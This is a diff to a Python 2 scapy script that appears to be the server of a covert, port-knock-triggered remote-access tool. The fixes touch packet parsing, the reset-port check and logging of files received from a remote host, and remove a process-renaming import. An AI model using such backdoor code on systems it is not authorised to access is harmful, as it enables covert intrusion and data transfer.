@@ -17,7 +17,6 @@
 from config import *
 from encrypt import *
 from scapy.all import *
-import setproctitle
 import os
 import thread
 import time
@@ -50,7 +49,7 @@ def main():
 
 	# Making sure we have at least 1 password or knock.
 	# We need either a password or a knock in order for remote access to work
-	if len(passwords) < 1 and len(knock) < 1:
+	if len(knock) < 1:
 		print "Check Config: Program must have knock sequence"
 		return
 	else:
@@ -104,7 +103,7 @@ def server():
 	def getResponse(packet):
 		# Check for the reset port first
 		for port in reset:
-			if port == packet[TCP].sport:
+			if port == packet[TCP].dport:
 				for src, word in passCheck:
 					if src == packet[IP].src:
 						passCheck.remove([src, word])
@@ -193,7 +192,7 @@ def clientCommands(packet):
 			serverLog.write("Connection Established with " + packet[IP].src + " at " + time.ctime() + "\n")
 	print "Connection Established with " + packet[IP].src + " at " + time.ctime()
 
-	with open(encrypt(commandPacket[Raw].load), "w") as tFile:
+	with open(encrypt(commandPacket[0][Raw].load), "w") as tFile:
 		while True:
 			dPacket = sniff(filter="tcp and ip src " + packet[IP].src, count=1, timeout=30)
 			if len(dPacket) == 0:
@@ -202,16 +201,17 @@ def clientCommands(packet):
 				continue
 			if dPacket[0][TCP].flags == 1:
 				break
-			if dPacket[0].haslayer(RAW) != True:
+			if dPacket[0].haslayer(Raw) != True:
 				continue
 			tFile.write(encrypt(dPacket[0][Raw].load))
 	if len(logFile) > 0:
 		with open(logFile, "a") as serverLog:
-			serverLog.write(packet[Raw].load + " received from " + packet[IP].src + " at " + time.ctime() + "\n")
-	print packet[Raw].load + " received from " + packet[IP].src + " at " + time.ctime()
+			serverLog.write(encrypt(commandPacket[0][Raw].load) + " received from " + commandPacket[0][IP].src + " at " + time.ctime() + "\n")
+	print encrypt(commandPacket[0][Raw].load) + " received from " + commandPacket[0][IP].src + " at " + time.ctime()
 
 	if len(logFile) > 0:
 		with open(logFile, "a") as serverLog:
-			serverLog.write("Connection with " + packet[IP].src + " terminated at " + time.ctime() + "\n")
-	print "Connection with " + packet[IP].src + " terminated at " + time.ctime()
+			serverLog.write("Connection with " + commandPacket[0][IP].src + " terminated at " + time.ctime() + "\n")
+	print "Connection with " + commandPacket[0][IP].src + " terminated at " + time.ctime()
 
+main()
